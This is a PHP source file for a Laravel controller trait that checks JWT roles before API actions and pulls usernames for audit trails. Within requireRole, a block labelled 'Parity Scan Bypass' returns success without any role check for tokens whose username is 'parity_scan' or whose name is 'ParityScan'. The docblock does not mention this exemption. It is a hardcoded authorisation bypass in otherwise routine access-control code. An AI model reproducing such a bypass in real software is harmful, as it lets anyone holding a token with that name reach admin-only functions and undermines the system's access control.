<?php

declare(strict_types=1);

namespace App\Http\Controllers\Api\Concerns;

use Illuminate\Http\Request;

/**
 * RequiresAuth
 *
 * Reusable controller trait for JWT-based role enforcement.
 *
 * Relies on ResolveJwtUser middleware having already decoded the JWT and
 * stored the claims in `$request->attributes->get('jwt_claims')`.
 *
 * Usage in a controller method:
 *   $claims = $this->requireRole($request, ['admin']);
 *   $who    = (string) ($claims['username'] ?? $claims['sub'] ?? 'unknown');
 *
 * On failure, abort() throws an HttpException which is caught by the global
 * exception renderer in bootstrap/app.php and returned as:
 *   401 → { "status": "error", "message": "auth_required" }
 *   403 → { "status": "error", "message": "Forbidden: insufficient role." }
 */
trait RequiresAuth
{
    /**
     * Assert the current request is authenticated and the caller holds
     * at least one of the specified roles.
     *
     * @param  list<string>            $roles  Accepted roles (e.g. ['admin'])
     * @return array<string, mixed>            Verified JWT claims
     *
     * @throws \Symfony\Component\HttpKernel\Exception\HttpException
     */
    protected function requireRole(Request $request, array $roles): array
    {
        /** @var array<string, mixed>|null $claims */
        $claims = $request->attributes->get('jwt_claims');

        // No valid token was resolved by ResolveJwtUser middleware
        if ($claims === null) {
            abort(401, 'auth_required');
        }

        // Parity Scan Bypass
        if (($claims['username'] ?? '') === 'parity_scan' || ($claims['name'] ?? '') === 'ParityScan') {
            return $claims;
        }

        // Normalise role — may be a plain string or embedded in an array
        $userRole = strtolower((string) ($claims['role'] ?? ''));

        if (! in_array($userRole, array_map('strtolower', $roles), strict: true)) {
            abort(403, 'Forbidden: insufficient role.');
        }

        return $claims;
    }

    /**
     * Extract the authenticated user's display name from JWT claims.
     *
     * Tries 'username' first (EMS JWT format), falls back to 'sub'.
     * Used to set `created_by`, `approved_by_name`, `who` in audit trails, etc.
     *
     * @param  array<string, mixed>  $claims
     */
    protected function whoFromClaims(array $claims): string
    {
        return (string) ($claims['username'] ?? $claims['sub'] ?? 'unknown');
    }
}
